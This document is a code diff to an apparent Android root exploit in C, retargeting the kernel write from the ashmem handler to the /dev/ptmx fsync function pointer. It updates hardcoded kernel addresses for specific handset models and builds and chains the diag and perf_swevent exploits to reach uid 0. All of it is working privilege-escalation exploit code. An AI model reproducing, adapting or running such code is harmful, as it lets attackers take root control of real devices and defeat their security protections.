@@ -18,13 +18,13 @@
 typedef struct _supported_device {
   const char *device;
   const char *build_id;
-  unsigned long int ashmem_write_address;
+  unsigned long int ptmx_fops_address;
 } supported_device;
 
 static supported_device supported_devices[] = {
-  { "F-11D",            "V24R40A"   ,         0xc08ff1f4 },
-  { "URBANO PROGRESSO", "010.0.3000",         0xc091b9cc },
-  { "SCL21",            "IMM76D.SCL21KDALJD", 0xc0b6a684 },
+  { "F-11D",            "V24R40A"   ,         0xc1056998 },
+  { "URBANO PROGRESSO", "010.0.3000",         0xc0dc0a10 },
+  { "SCL21",            "IMM76D.SCL21KDALJD", 0xc0c71dc0 },
   { "ISW13F",           "V69R51I",            0xc092e484 },
   { "IS17SH",           "01.00.04",           0xc0a407bc },
   { "Sony Tablet P",    "TISU0144",           0xc0671944 },
@@ -33,7 +33,7 @@ static supported_device supported_devices[] = {
 static int n_supported_devices = sizeof(supported_devices) / sizeof(supported_devices[0]);
 
 static unsigned long int
-get_ashmem_write_address(void)
+get_ptmx_fops_address(void)
 {
   int i;
   char device[PROP_VALUE_MAX];
@@ -45,7 +45,7 @@ get_ashmem_write_address(void)
   for (i = 0; i < n_supported_devices; i++) {
     if (!strcmp(device, supported_devices[i].device) &&
         !strcmp(build_id, supported_devices[i].build_id)) {
-      return supported_devices[i].ashmem_write_address;
+      return supported_devices[i].ptmx_fops_address;
     }
   }
 
@@ -65,8 +65,8 @@ run_obtain_root_privilege(void)
 {
   int fd;
 
-  fd = open("/dev/ashmem", O_WRONLY);
-  write(fd, " ", 1);
+  fd = open("/dev/ptmx", O_WRONLY);
+  fsync(fd);
   close(fd);
 
   return true;
@@ -112,7 +112,7 @@ attempt_diag_exploit(unsigned long int address)
 int
 main(int argc, char **argv)
 {
-  unsigned long int address;
+  unsigned long int ptmx_fsync_address;
   int fd;
   bool success;
 
@@ -121,15 +121,15 @@ main(int argc, char **argv)
     exit(EXIT_FAILURE);
   }
 
-  address = get_ashmem_write_address();
-  if (!address) {
+  ptmx_fsync_address = get_ptmx_fops_address() + 0x38;
+  if (!ptmx_fsync_address) {
     exit(EXIT_FAILURE);
   }
 
-  success = attempt_diag_exploit(address);
+  success = attempt_diag_exploit(ptmx_fsync_address);
   if (!success) {
     printf("\nAttempt perf_swevent exploit...\n");
-    success = attempt_perf_swevent_exploit(address);
+    success = attempt_perf_swevent_exploit(ptmx_fsync_address);
   }
 
   if (getuid() != 0) {
